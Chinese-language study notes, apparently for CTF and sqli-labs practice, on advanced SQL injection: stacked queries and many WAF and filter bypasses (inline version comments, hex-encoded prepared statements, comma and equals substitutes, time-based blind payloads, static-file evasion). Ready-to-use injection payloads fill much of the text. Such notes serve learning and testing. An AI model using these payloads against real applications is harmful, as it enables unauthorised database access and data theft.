---
title: "SQL注入进阶"
---



## 一.堆叠注入

#### 1.原理

执行多个sql查询语句，不同查询语句之间用`;`隔开

例如

```
？id=1';show databases;
```

#### 2.限制条件

* DBMS是否允许多个查询，比如MySQL、PostgreSQL 和 SQL Server允许多个查询

* 不同编程语言执行多个sql查询的函数不同

  * PHP

    PHP中一般执行sql查询的语句是`mysql_query()`，而实现多次执行sql查询的函数为`mysqli_multi_query()`，除此以外，`PDO`也可以执行多次查询（这里不做过多介绍）

  * python

    在python中执行多次查询可以用`mysql-connector-python`或者`PyMySQL`库

#### 3.show语句（通常用于查看数据库的结构信息，并不能直接查看表中的具体数据）

* `show databases`查看所有数据库
* `show tables from database_name(show tables) `查看所有的表名
* `show columns from table_name from databese_name`查看列名



## 二.sql注入绕过

#### 1.空格绕过

* 注释符**`/* */`**绕过

* 括号`()`绕过

  贼难用，建议不用

* Tab`%09` `%0b`绕过

* 换行`%0a` `%0d`绕过

* 换页`%0c`绕过

* 不间断空格%a0

* 反引号绕过（可尝试，有版本限制）



#### 2.引号绕过

* 十六进制绕过

  例如：

  ```
  where table_schema="security" -- a
  where table_schema=0x7365637572697479 -- a
  ```

* `\`转义字符绕过引号（使用条件是有两个输入点）

  例如：sqli-lab第11关（post传参有两个输入点）

  <img src="C:\Users\TESE\AppData\Roaming\Typora\typora-user-images\image-20250102213136343.png" alt="image-20250102213136343" style="zoom:80%;" />



#### 3.内联注释绕过

* 可用于绕过常见waf
* 可用于绕过空格

```
?id=1/*!50726union*//*!50726select*/1,username,3/*!50726from*/users -- a #50726指版本号5.726
```

使

* 当MySQL数据库的实际版本号大于等于内联注释中的版本号时，MySQL就可以执行内联注释中的代码
* 可以用`select version()`查询版本号



#### 4.大小写绕过

SQL对大小写不敏感，可以用大小写混写绕过一些关键字的过滤



#### 5.双写绕过> 

* 适用于`preg_replace()`函数

  例如`oorr aandnd `



#### 6.关键字绕过

* Unicode绕过

##### （1）关键字`and or xor no`绕过

* `and`被过滤可以用`&&`来代替
* `or`被过滤可以使用`||`来代替
* `xor`被过滤可以使用`|`来代替
* `no`被过滤可以使用`!`来代替

##### （2）关键字`select`绕过

* `select`被过滤，可以使用`handler`来代替（详细见下文）

* 双重url编码绕过（适用于`preg_match()`函数）

* 十六进制编码绕过

  例如[强网杯2019]随便注
  
  ```
  1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
  ```
  
  payload原理是  将查询语句字符串十六进制编码，并用SET方法将字符串赋值给变量a，然后用预处理语句`prepare`从变量a中获取查询语句，在用`execute`语句执行查询语句
  
  * **该payload有局限性，必须是允许多次查询的题目（允许堆叠注入）才能用这种方法绕过过滤**



#### 7.逗号绕过

* `from for `替换

  在使用`substr(),mid(),limit()`等函数时，`,1,1`可以替换成`from 1 for 1 `	

* `join`替换

  在查多显示位时，例如`select 1,2,3 `，可以用`join`替换逗号，payload如下

  `select * from (select 1)a join (select 2)b join (select 3)c `

* `offset`替换

  在使用`limit()`函数时，例如`limit 0,1`可以换成 `limit 1 offset 0`

* `like `模糊匹配

  在盲注的时候，可能使用`substr(),mid() `等函数抓取单个字符，并用`ascii()`函数判断是否正确，可以用`like`模糊匹配代替

  例如

  ```
  select ascii(mid(user(),1,1))=80
  select user() like 'r%'
  ```

  `like`模糊匹配会返回0和1，正确为1，错误为0



#### 8.等号绕过

*  `like`替代

* `rlike`替代

* `regexp`替代

* `in`替代（后面要跟括号）

* `<>`替代（比较大小的时候）

  举例

  ```
  ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema = 'security' --+
  ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema like 'security' --+
  ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema rlike 'security' --+
  ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema regexp'security' --+
  ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema in ('security') --+
  ```

* `between and `替代

  ```
  ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema  between 'security' and 'security' --+
  ```

  

#### 9.比较符绕过

* `greatest()，least()`函数替代

  `greatest(n1,n2,n3,...)`会返回输入的参数中最大的，`least(n1,n2,n3,...)`函数会返回输入的参数中最小的

  ```
  数据库为'security'
  select greatest(ascii(substr(database(),1,1)),64)   #返回115
  select least(ascii(substr(database(),1,1)),64)      #返回64
  ```

* `strcmp()`函数替换

  `strcmp(n1,n2)`函数会比较输入的两个参数（字符串）的大小，一般是根据ASCII码表来比较

  * `n1=n2`返回 0
  * `n1<n2`返回 -1
  * `n1>n2`返回 1 

  例如`?id=-1' union select 1,strcmp(ascii(substr('select database()',1,1)),115),3 --+`返回 0



#### 10.order by 绕过

* 可以用`into `变量名来代替、

* 直接一个一个试，直到不报错为止

  ```
  select 1,2,3 --+
  ```



#### 11.information_schema绕过

* 可以用`mysql.innodb_table_stats`来代替`information_schema.tables`

* 也可以用`mysql.innodb_index_stats`来代替

  **之后使用无列名注入即可**



#### 12.`if()`函数过滤绕过

* `locate()`函数与`sleep()`（任意时间函数）的利用

  原理：`locate(s1,s2)`函数会比较输入的两个参数（只能是字符串），第一个参数是参照物，第二个参数是参照对象，该函数会判断参照对象中是否含有参照物，若不含有，则返回0，若含有，则返回该参照物在参照对象中的位置。因此，通过判断返回的值来实现盲注

  ```
  ?id=-1' union select 1,2,locate('e',database())=2 ||sleep(10) -- a
  ```

  如果数据库名的第二个字符是e，则无延迟，不是则有延迟

* `ascii()`函数与`sleep()`函数的利用

  ```
  ?id=-1' union select 1,2, ascii(substr(database(),1,1))=115 ||sleep(10) -- a
  ```

* `case`语句绕过

  payload如下

  ```
   and case when condition then result1（条件为真） else result0（条件为否） end
   
   ?id=1' and case when ascii(substr(database(),1,1))=115 then sleep(10) else 1 end -- a
  ```

* `elt()`函数利用

  原理：`elt(3,s1,s2，s3)`函数中第一个参数为索引（整数，从1开始），其余参数皆为字符串，该函数会根据索引，比如第一个参数为2，返回第二个字符串
  
  payload如下
  
  ````
  and elt((length(database())=3),sleep(3));
  ````
  
  索引位置写条件，根据真或假返回0和1，如果条件为真，返回1就会触发延时



#### 12.花括号绕过（绕过waf）

例如 `select 1,{x datbase()},3 --+`

原理：花括号左边是注释（左边可以是任意字母，但不能是数字），右边是查询语句的一部分



#### 13.等价函数绕过

* ·`sleep()`  ==>  `benchmark()`

* `concat_ws()`  ==>   `group_concat()`

* `mid()`  ==> `substr()`  ==>`substring()`

  

#### 14.闭合方式（注释符）绕过

* `and '1'='1`\
* `||’1`即`or ‘1`

**根据实际的闭合方式来确定符号**



#### 15.静态文件绕过（绕过waf）

**原理：除了白名单信任文件和目录外，有些waf不会对静态文件进行拦截。比如一些图片文件jpg，png，gif或者css，js，从而绕过waf拦截**

例如

```
?id=-1.js$a='union select 1,2,3'
?id=-1.jpg$a='union select 1,2,3'
?/1.jpg$a='union select 1,2,3'
?/1.css=1.css$a='union select 1,2,3'
```



#### 16.大量字符串绕过（绕过waf）

可以用`select 0xA`再配合内联注释，绕过一些waf的拦截，payload如下

```
?id=1 and (select 1)and(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,2,user() --+
?id=1 and(select 1)and(select 0xA*1000)/*!union*//*!select*/1,2,user() --+
```



#### 17.换行混合绕过（绕过waf）

一般的waf会过滤`union select`可以通过注释+换行来raoguo

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6fa4ede2a616be2ebc28fca4e2bc2d48.png)



